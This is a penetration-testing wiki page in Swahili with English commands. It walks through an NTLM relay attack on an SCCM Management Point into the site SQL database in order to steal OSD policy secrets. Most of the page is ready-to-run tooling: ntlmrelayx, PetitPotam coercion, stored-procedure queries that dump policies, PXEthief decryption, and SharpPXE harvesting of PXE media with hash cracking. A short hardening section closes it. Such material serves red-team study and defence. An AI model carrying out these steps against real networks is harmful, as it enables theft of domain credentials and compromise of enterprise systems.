# SCCM Management Point NTLM Relay to SQL – Utoaji wa Siri za OSD Policy

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kujithibitisha kupitia SMB/RPC na **kurelaya** akaunti hiyo ya mashine ya NTLM kwenda kwenye **site database (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Roles hizi zinakuruhusu kuita seti ya stored procedures zinazofichua policy blobs za **Operating System Deployment (OSD)** (michanganyiko ya Network Access Account, Task-Sequence variables, n.k.). Blobs hizo zimewekwa kwa hex na zimesimbwa kwa encryption, lakini zinaweza ku-decode na ku-decrypt kwa **PXEthief**, hivyo kupata secrets katika plaintext.

Mlolongo wa kiwango cha juu:
1. Gundua MP na site DB ↦ endpoint ya HTTP isiyohitaji authentication `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Anzisha `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Laza MP kwa kutumia **PetitPotam**, PrinterBug, DFSCoerce, n.k.
4. Kupitia SOCKS proxy, unganisha kwa `mssqlclient.py -windows-auth` kama akaunti ya **<DOMAIN>\\<MP-host>$** iliyorelayiwa.
5. Tekeleza:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (au `MP_GetPolicyBodyAfterAuthorization`)
6. Ondoa BOM ya `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets kama `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, n.k. hupatikana bila kugusa PXE au clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Kuhesabu MP endpoints zisizohitaji authentication
MP ISAPI extension **GetAuth.dll** hufichua parameters kadhaa ambazo hazihitaji authentication (isipokuwa site ikiwa PKI-only):<sup>[[1]](#references)</sup>

| Parameter | Kazi |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Hurejesha public key ya site signing cert pamoja na GUID za vifaa vya *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Huorodhesha kila Management-Point kwenye site. |
| `SITESIGNCERT` | Hurejesha Primary-Site signing certificate (hutambua site server bila LDAP). |

Chukua GUID zitakazotumika kama **clientID** kwa DB queries zinazofuata:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay machine account ya MP kwa MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Coercion inapotokea unapaswa kuona kitu kama:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Tambua sera za OSD kupitia stored procedures
Unganisha kupitia SOCKS proxy (port 1080 kwa chaguo-msingi):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Badilisha hadi DB ya **CM_<SiteCode>** (tumia site code yenye tarakimu 3, kwa mfano `CM_001`).

### 3.1  Tafuta GUID za Unknown-Computer (hiari)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Orodhesha sera zilizogawiwa
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Kila safu ina `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Lenga policies:
* **NAAConfig**  – credentials za Network Access Account
* **TS_Sequence** – variables za Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Inaweza kuwa na akaunti za run-as

### 3.3  Retrieve full body
Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kuruka hitaji la clientID ukitumia:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT: Katika SSMS ongeza “Maximum Characters Retrieved” (>65535) la sivyo blob itakatwa.

---

## 4. Decode & decrypt blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Mfano wa secrets zilizopatikana:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. SQL roles & procedures muhimu
Baada ya relay, login inawekwa kwenye:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Roles hizi zinaonyesha ruhusa nyingi za EXEC, zinazotumika katika attack hii ni hizi:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Orodhesha policies zilizotumika kwa `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Rudisha policy body kamili. |
| `MP_GetListOfMPsInSiteOSD` | Hurudishwa na `MPKEYINFORMATIONMEDIA` path. |

Unaweza kukagua orodha kamili kwa:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Ukusanyaji wa media za PXE boot (SharpPXE)
* **Jibu la PXE kupitia UDP/4011**: tuma ombi la PXE boot kwa Distribution Point iliyosanidiwa kwa PXE. Jibu la proxyDHCP hufichua njia za boot kama `SMSBoot\\x64\\pxe\\variables.dat` (config iliyosimbwa kwa njia fiche) na `SMSBoot\\x64\\pxe\\boot.bcd`, pamoja na encrypted key blob ya hiari.<sup>[[4]](#references)</sup>
* **Pata boot artifacts kupitia TFTP**: tumia njia zilizorejeshwa kupakua `variables.dat` kupitia TFTP (bila authentication). Faili hii ni ndogo (KB chache) na ina media variables zilizosimbwa kwa njia fiche.
* **Decrypt au crack**:
- Ikiwa jibu lina decryption key, ipe **SharpPXE** ili itoe encryption ya `variables.dat` moja kwa moja.
- Ikiwa hakuna key iliyotolewa (PXE media imelindwa kwa custom password), SharpPXE hutoa hash inayooana na **Hashcat** ya `$sccm$aes128$...` kwa offline cracking. Baada ya kurejesha password, decrypt faili hiyo.
* **Parse XML iliyodecryptiwa**: plaintext variables zina SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs, na identifiers nyingine). SharpPXE huziparse na kuchapisha command ya **SharpSCCM** iliyo tayari kuendeshwa, yenye GUID/PFX/site parameters zilizojazwa awali kwa follow-on abuse.
* **Mahitaji**: network reachability pekee kwa PXE listener (UDP/4011) na TFTP; local admin privileges hazihitajiki.

---

## 7. Utambuzi na Uimarishaji
1. **Fuatilia MP logins** – MP computer account yoyote inayo-login kutoka IP ambayo si host yake ≈ relay.<sup>[[1]](#references)</sup>
2. Wezesha **Extended Protection for Authentication (EPA)** kwenye site database (`PREVENT-14`).
3. Zima NTLM isiyotumika, lazimisha SMB signing, zuia RPC (
mitigation zilezile zinazotumika dhidi ya `PetitPotam`/`PrinterBug`).
4. Imarisha mawasiliano ya MP ↔ DB kwa IPSec / mutual-TLS.
5. **Punguza PXE exposure** – firewall UDP/4011 na TFTP kwa trusted VLANs, hitaji PXE passwords, na toa alert kwa TFTP downloads za `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Tazama pia
* Misingi ya NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Marejeo
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
